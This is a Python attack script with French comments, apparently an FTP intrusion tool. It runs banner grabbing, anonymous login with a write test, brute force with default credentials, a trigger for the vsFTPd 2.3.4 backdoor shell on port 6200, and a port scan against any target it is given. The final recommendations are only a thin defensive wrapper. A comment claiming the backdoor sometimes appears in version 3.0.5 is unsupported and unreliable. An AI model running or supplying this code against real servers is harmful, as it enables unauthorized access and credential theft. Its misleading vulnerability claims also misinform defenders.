import socket
import ftplib
import time
import re
import os
from typing import Dict, List
import subprocess

def advanced_ftp_attacker(target: str, port: int = 21) -> Dict:
    """
    Exécute une attaque FTP avancée avec multiple techniques.
    
    Args:
        target: Cible FTP
        port: Port FTP
    
    Returns:
        Résultats détaillés de l'attaque
    """
    
    results = {
        "target": target,
        "port": port,
        "banner": "",
        "service": "",
        "version": "",
        "techniques_tried": [],
        "successful_techniques": [],
        "credentials_found": False,
        "shell_obtained": False,
        "system_info": {},
        "vulnerabilities_found": [],
        "recommendations": []
    }
    
    # Technique 1: Banner grabbing et fingerprinting
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((target, port))
        banner = sock.recv(1024).decode(errors='ignore')
        sock.close()
        
        results["banner"] = banner.strip()
        results["techniques_tried"].append("banner_grabbing")
        
        # Analyse de la bannière
        banner_lower = banner.lower()
        if "vsftpd" in banner_lower:
            results["service"] = "vsFTPd"
            match = re.search(r'vsFTPd\s+([\d\.]+)', banner, re.IGNORECASE)
            if match:
                results["version"] = match.group(1)
        elif "proftpd" in banner_lower:
            results["service"] = "ProFTPD"
            match = re.search(r'ProFTPD\s+([\d\.]+)', banner, re.IGNORECASE)
            if match:
                results["version"] = match.group(1)
                
    except Exception as e:
        results["techniques_tried"].append(f"banner_grabbing_error: {str(e)}")
    
    # Technique 2: Test de connexion anonyme
    try:
        ftp = ftplib.FTP()
        ftp.connect(target, port, timeout=5)
        ftp.login()
        results["techniques_tried"].append("anonymous_login")
        results["successful_techniques"].append("anonymous_login")
        
        # Récupérer des informations
        try:
            current_dir = ftp.pwd()
            results["system_info"]["current_directory"] = current_dir
            
            # Lister les fichiers
            files = []
            ftp.dir(files.append)
            results["system_info"]["files"] = files[:10]
            
            # Tester l'écriture
            try:
                ftp.mkd("test_msf_dir")
                results["system_info"]["writable"] = True
                ftp.rmd("test_msf_dir")
            except:
                results["system_info"]["writable"] = False
            
        except Exception as e:
            results["system_info"]["error"] = str(e)
        
        ftp.quit()
        
    except ftplib.error_perm:
        results["techniques_tried"].append("anonymous_login_failed")
    except Exception as e:
        results["techniques_tried"].append(f"anonymous_login_error: {str(e)}")
    
    # Technique 3: Brute force avec dictionnaire étendu
    if not results.get("credentials_found", False):
        common_credentials = [
            ("admin", "admin"),
            ("root", "root"),
            ("ftp", "ftp"),
            ("user", "user"),
            ("test", "test"),
            ("administrator", "password"),
            ("webmaster", "webmaster"),
            ("info", "info"),
            ("sales", "sales"),
            ("support", "support")
        ]
        
        for username, password in common_credentials:
            try:
                ftp = ftplib.FTP()
                ftp.connect(target, port, timeout=3)
                ftp.login(username, password)
                
                results["credentials_found"] = True
                results["successful_techniques"].append("brute_force")
                results["system_info"]["credentials"] = {
                    "username": username,
                    "password": password
                }
                
                ftp.quit()
                break
                
            except:
                continue
        
        results["techniques_tried"].append("brute_force_common")
    
    # Technique 4: Test de vulnérabilités spécifiques
    if results["service"] == "vsFTPd":
        # Test backdoor 2.3.4 même sur version 3.0.5 (parfois présente)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target, port))
            
            sock.recv(1024)  # Lire bannière
            sock.send(b"USER msf:)\n")
            time.sleep(1)
            sock.send(b"PASS msf\n")
            time.sleep(1)
            sock.close()
            
            time.sleep(2)
            
            # Vérifier port 6200
            backdoor_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            backdoor_sock.settimeout(3)
            
            try:
                backdoor_sock.connect((target, 6200))
                results["vulnerabilities_found"].append({
                    "name": "vsFTPd 2.3.4 Backdoor",
                    "severity": "critical",
                    "port": 6200,
                    "status": "open"
                })
                results["shell_obtained"] = True
                backdoor_sock.close()
            except:
                pass
            
            results["techniques_tried"].append("vsftpd_backdoor_test")
            
        except Exception as e:
            results["techniques_tried"].append(f"vsftpd_backdoor_error: {str(e)}")
    
    # Technique 5: Scan de ports FTP alternatifs
    ftp_ports = [20, 21, 2121, 8021, 8080, 8081]
    open_ports = []
    
    for ftp_port in ftp_ports:
        if ftp_port == port:
            continue
            
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((target, ftp_port))
            if result == 0:
                open_ports.append(ftp_port)
            sock.close()
        except:
            pass
    
    if open_ports:
        results["system_info"]["alternative_ftp_ports"] = open_ports
        results["techniques_tried"].append("port_scanning")
    
    # Générer des recommandations
    if results["credentials_found"]:
        results["recommendations"].append("Change default credentials immediately")
    
    if "anonymous_login" in results["successful_techniques"]:
        results["recommendations"].append("Disable anonymous FTP access")
    
    if results["vulnerabilities_found"]:
        results["recommendations"].append("Apply security patches for identified vulnerabilities")
    
    if results["service"] and results["version"]:
        results["recommendations"].append(f"Update {results['service']} from version {results['version']} to latest")
    
    return results